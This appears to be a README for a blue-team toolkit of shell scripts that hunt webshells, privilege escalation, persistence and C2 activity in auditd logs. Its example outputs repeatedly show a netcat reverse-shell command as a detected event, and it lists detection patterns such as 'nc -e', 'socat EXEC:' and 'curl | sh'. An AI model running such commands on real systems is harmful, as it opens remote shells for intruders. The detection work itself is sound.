# Threat Hunting Toolkit

POSIX-compliant shell scripts for **active threat hunting** using auditd logs. Built for CCDC blue team operations where speed and accuracy matter.

```
  _____ _                    _     _   _             _
 |_   _| |__  _ __ ___  __ _| |_  | | | |_   _ _ __ | |_
   | | | '_ \| '__/ _ \/ _` | __| | |_| | | | | '_ \| __|
   | | | | | | | |  __/ (_| | |_  |  _  | |_| | | | | |_
   |_| |_| |_|_|  \___|\__,_|\__| |_| |_|\__,_|_| |_|\__|
```

## Why This Exists

During CCDC, you don't have time to manually grep through audit logs. When you spot a suspicious process, you need answers **now**:

- *"What spawned this process?"*
- *"Is there a webshell on this box?"*
- *"Did the attacker create persistence?"*
- *"What has this user been doing?"*

These scripts answer those questions in seconds.

---

## Prerequisites

1. **auditd running** with the CCDC rules loaded:
   ```bash
   # Check if auditd is running
   systemctl status auditd

   # Load the rules (if not already)
   auditctl -R /path/to/one-file-to-rule-them-all.rules
   ```

2. **Root access** (or CAP_AUDIT_READ capability):
   ```bash
   sudo ./hunt.sh
   ```

3. **POSIX shell** - works with sh, bash, dash, etc.

---

## Quick Start

### Option 1: Interactive Menu (Recommended)

```bash
sudo ./hunt.sh
```

This launches an interactive menu where you can select what to hunt for.

### Option 2: Direct Commands

```bash
# Trace a suspicious process back to its origin
sudo ./trace-parent.sh 4444

# Find webshell activity in the last 10 minutes
sudo ./hunt-webshell.sh -ts recent

# Check for privilege escalation today
sudo ./hunt-privesc.sh -ts today

# Track everything a user has done
sudo ./hunt-user.sh www-data -ts today
```

---

## The Scripts

### `hunt.sh` - Interactive Menu

The main entry point. Presents a menu of all available hunting tools.

```bash
sudo ./hunt.sh
```

```
Available Hunting Tools:

[1] Trace Process Parent
    Trace the full ancestry of a process back to init

[2] Hunt by Audit Key
    Search for events by audit key (e.g., privesc_root_cmd)

[3] Hunt Webshells
    Find web server processes executing commands
...
```

---

### `trace-parent.sh` - Process Ancestry Tracer

**The most important script.** When you find a suspicious process, this traces it back through its entire parent chain to show you exactly how it was spawned.

```bash
sudo ./trace-parent.sh <PID> [max_depth]
```

**Example:** You see a suspicious `nc` process (PID 4444):

```bash
sudo ./trace-parent.sh 4444
```

**Output:**
```
╔══════════════════════════════════════════════════════════╗
║          Process Ancestry Trace                          ║
╚══════════════════════════════════════════════════════════╝

Target PID:  4444
Max Depth:   50

Process Tree:
════════════════════════════════════════

├─ PID 4444 (TARGET) [ccdc_netcat]
│  PPID: 3333
│  Time: 2024-12-26 10:30:15
│  Exec: /usr/bin/nc
│  User: www-data (33)
│  Args: nc -e /bin/sh 10.0.0.100 4444
│
  ├─ PID 3333 [ccdc_web_exec]
  │  PPID: 2222
  │  Time: 2024-12-26 10:30:14
  │  Exec: /bin/sh
  │  User: www-data (33)
  │  Args: sh -c nc -e /bin/sh 10.0.0.100 4444
  │
    ├─ PID 2222
    │  PPID: 1111
    │  Time: 2024-12-26 09:00:00
    │  Exec: /usr/sbin/apache2
    │  User: www-data (33)
    │
      ├─ PID 1 (init)

Reached init (PID 1) - ancestry trace complete!
```

**Analysis:** Apache spawned a shell which ran netcat with `-e` (execute) - classic webshell reverse shell.

---

### `hunt-webshell.sh` - Webshell Detection

Finds any commands executed by web server users (www-data, apache, nginx). Web servers should **never** be spawning shells.

```bash
sudo ./hunt-webshell.sh [-ts timespec]
```

**Example:**
```bash
sudo ./hunt-webshell.sh -ts today
```

**What it detects:**
- Shell execution (sh, bash) by web users
- Network tools (nc, curl, wget) from web processes
- Base64 decoding (encoded payloads)
- Execution from /tmp or /dev/shm
- Piped shell execution (`curl ... | sh`)

**Output highlights threats:**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  2024-12-26 10:30:15 | User: www-data | PID: 3333
  Exec: /bin/sh
  Cmd:  sh -c nc -e /bin/sh 10.0.0.100 4444
  Key:  ccdc_web_exec | PPID: 2222
  [CRITICAL] Shell execution detected
```

---

### `hunt-privesc.sh` - Privilege Escalation Hunter

Finds sudo/su usage, setuid abuse, and any commands run as root by non-root users.

```bash
sudo ./hunt-privesc.sh [-ts timespec]
```

**What it detects:**
- Commands run as root by regular users
- sudo and su usage
- Sudoers file modifications
- Setuid/setgid bit changes (`chmod +s`)
- pkexec usage

**Example output:**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [SUCCESS] 2024-12-26 11:45:22
  PID: 5678  PPID: 5600
  Running as: attacker -> euid=0
  Login user: attacker
  Exec: /usr/bin/sudo
  Cmd:  sudo -i
  Key:  privesc_root_cmd
  [SHELL] Sudo shell access
```

---

### `hunt-persistence.sh` - Persistence Mechanism Hunter

Finds modifications to anywhere an attacker might establish persistence.

```bash
sudo ./hunt-persistence.sh [-ts timespec]
```

**Monitors:**
| Location | Type |
|----------|------|
| `/etc/cron.*`, `/var/spool/cron` | Scheduled tasks |
| `/etc/systemd/system/` | Systemd services |
| `/etc/init.d/`, `/etc/rc.local` | Init scripts |
| `~/.bashrc`, `~/.profile` | Shell configs |
| `~/.ssh/authorized_keys` | SSH keys |
| `/etc/passwd`, `/etc/shadow` | User accounts |
| `/var/www/` | Web shells |
| `/etc/ld.so.preload` | Library hijacking |

**Example output:**
```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  [SUCCESS] 2024-12-26 12:00:01
  Path: /etc/cron.d/backdoor (CREATE)
  User: root (login: attacker)
  Tool: /usr/bin/vim
  PID:  6789  Key: persist_sched_task
  [CRON] Scheduled task modification
```

---

### `hunt-c2.sh` - C2 & Exfiltration Hunter

Finds command-and-control tools and data exfiltration attempts.

```bash
sudo ./hunt-c2.sh [-ts timespec]
```

**Detects:**

| Tool | Threat Level | Why |
|------|--------------|-----|
| `nc -e`, `ncat -e` | CRITICAL | Backdoor with shell |
| `nc -l` | CRITICAL | Listener (backdoor) |
| `socat EXEC:` | CRITICAL | Shell execution |
| `curl \| sh` | CRITICAL | Download and execute |
| `wget \| sh` | CRITICAL | Download and execute |
| `ssh -R`, `ssh -L` | HIGH | Tunneling |
| `tar`, `gzip`, `zip` | MEDIUM | Exfil preparation |
| `base64` | MEDIUM | Encoding data |

---

### `hunt-timeline.sh` - Event Timeline Generator

Creates a chronological timeline of all security events. Great for incident documentation.

```bash
sudo ./hunt-timeline.sh [-ts timespec] [-o output.csv] [-v]
```

**Options:**
- `-ts`: Start time
- `-o`: Export to CSV file
- `-v`: Verbose (include low-priority events)

**Example:**
```bash
# View timeline on screen
sudo ./hunt-timeline.sh -ts today

# Export for report
sudo ./hunt-timeline.sh -ts today -o incident_timeline.csv
```

**Output:**
```
─── 2024-12-26 10:30 ───
[CRITICAL] ccdc_web_exec        www-data   /bin/sh
           └─ sh -c nc -e /bin/sh 10.0.0.100 4444
[CRITICAL] ccdc_netcat          www-data   /usr/bin/nc
           └─ nc -e /bin/sh 10.0.0.100 4444

─── 2024-12-26 10:35 ───
[HIGH]     privesc_root_cmd     attacker   /usr/bin/sudo
           └─ sudo -i
```

---

### `hunt-user.sh` - User Activity Tracker

Tracks everything a specific user has done. Use when you've identified a compromised account.

```bash
sudo ./hunt-user.sh <username|uid> [-ts timespec]
```

**Example:**
```bash
sudo ./hunt-user.sh www-data -ts today
sudo ./hunt-user.sh 1000 -ts recent
sudo ./hunt-user.sh attacker -ts today
```

**Output includes:**
- Activity summary (commands, file ops, network ops)
- All command executions with categorization
- Suspicious activity check (privesc, C2, persistence, tmp execution)

---

### `hunt-by-key.sh` - Search by Audit Key

General-purpose search by any audit key. Use when you know exactly what you're looking for.

```bash
sudo ./hunt-by-key.sh <key> [-ts timespec]
```

**Example:**
```bash
sudo ./hunt-by-key.sh ccdc_web_exec -ts today
sudo ./hunt-by-key.sh kernel_module -ts this-week
sudo ./hunt-by-key.sh defense_impair_fw
```

Run without arguments to see a list of common keys.

---

## Time Specifications

All scripts accept `-ts` for start time:

| Syntax | Meaning |
|--------|---------|
| `-ts recent` | Last 10 minutes |
| `-ts today` | Since midnight |
| `-ts this-week` | Since start of week |
| `-ts "12/25/2024"` | Specific date |
| `-ts "12/25/2024 10:00:00"` | Specific date/time |
| *(omit -ts)* | Search all logs |

---

## Common Audit Keys

These are the keys defined in `one-file-to-rule-them-all.rules`:

### Critical Priority (ccdc_*)
| Key | What it catches |
|-----|-----------------|
| `ccdc_web_exec` | Web server running commands |
| `ccdc_web_socket` | Web server creating sockets |
| `ccdc_netcat` | Netcat execution |
| `ccdc_adduser` | adduser command |
| `ccdc_useradd` | useradd command |
| `ccdc_passwd` | passwd command |
| `ccdc_ssh` | SSH config changes |
| `ccdc_systemd` | Systemd modifications |
| `ccdc_tmp` | Activity in /tmp |

### Privilege Escalation (privesc_*)
| Key | What it catches |
|-----|-----------------|
| `privesc_root_cmd` | Root commands by non-root |
| `privesc_sudoers` | Sudoers modifications |
| `privesc_su` | su command usage |
| `privesc_abuse` | Ownership abuse |

### Persistence (persist_*)
| Key | What it catches |
|-----|-----------------|
| `persist_sched_task` | Cron/at modifications |
| `persist_boot` | Boot script changes |
| `persist_accounts` | Account modifications |
| `persist_shell_config` | Shell RC file changes |
| `persist_webshell` | Web directory changes |

### C2 & Exfiltration
| Key | What it catches |
|-----|-----------------|
| `c2_susp_tools` | curl, wget, ssh, nmap, etc. |
| `c2_tools` | nc, ncat, socat |
| `c2_dns` | DNS config changes |
| `exfil_compress` | tar, gzip, zip, etc. |
| `exfil_anon_file` | memfd_create (fileless) |

### Defense Evasion (defense_*)
| Key | What it catches |
|-----|-----------------|
| `defense_perm_mod` | chmod/chown |
| `defense_impair_fw` | Firewall config changes |
| `defense_impair_audit` | Audit config changes |
| `defense_clear_logs` | Log file modifications |
| `defense_masquerade` | Binary directory changes |

---

## Incident Response Workflow

### 1. Initial Triage
```bash
# Get overview of recent critical events
sudo ./hunt-timeline.sh -ts recent
```

### 2. Check Common Attack Vectors
```bash
# Webshells (most common initial access)
sudo ./hunt-webshell.sh -ts today

# Privilege escalation
sudo ./hunt-privesc.sh -ts today

# C2 beacons
sudo ./hunt-c2.sh -ts today
```

### 3. Investigate Suspicious Process
```bash
# Found suspicious PID 4444? Trace it
sudo ./trace-parent.sh 4444
```

### 4. Track Attacker Activity
```bash
# Identified compromised user 'attacker'?
sudo ./hunt-user.sh attacker -ts today
```

### 5. Check for Persistence
```bash
# Before you think you're done...
sudo ./hunt-persistence.sh -ts today
```

### 6. Document
```bash
# Export timeline for report
sudo ./hunt-timeline.sh -ts today -o incident_$(date +%Y%m%d).csv
```

---

## Tips

1. **Start broad, then narrow down**
   - Begin with `hunt-timeline.sh` to see everything
   - Then use specific hunters based on what you find

2. **Always trace suspicious processes**
   - `trace-parent.sh` reveals the full attack chain
   - Web server → shell → malware is a common pattern

3. **Check persistence LAST**
   - Attackers often install persistence after initial access
   - Don't declare victory until you've checked

4. **Use time filters**
   - `-ts recent` for active incidents (last 10 min)
   - `-ts today` for daily review
   - No filter for historical investigation

5. **Export for documentation**
   - `hunt-timeline.sh -o file.csv` creates importable evidence
   - Include in incident reports

6. **Combine with live investigation**
   ```bash
   # Current connections
   ss -tunap

   # Listening ports
   ss -tlnp

   # Running processes
   ps auxf

   # Then trace suspicious PIDs
   sudo ./trace-parent.sh <pid>
   ```

---

## Troubleshooting

### "Cannot access audit logs"
```bash
# Run as root
sudo ./hunt.sh

# Or check auditd is running
systemctl status auditd
```

### "No events found"
```bash
# Check if rules are loaded
auditctl -l | head

# Check if logs exist
ls -la /var/log/audit/

# Try broader time range
sudo ./hunt-webshell.sh  # no -ts = search all
```

### "Process not found in audit logs"
- Process started before auditd was enabled
- Audit logs may have rotated
- If process is still running, script falls back to /proc

---

## File Locations

| Path | Purpose |
|------|---------|
| `/var/log/audit/audit.log` | Current audit log |
| `/var/log/audit/audit.log.*` | Rotated logs |
| `/etc/audit/rules.d/` | Audit rules |
| `/etc/audit/auditd.conf` | Audit daemon config |
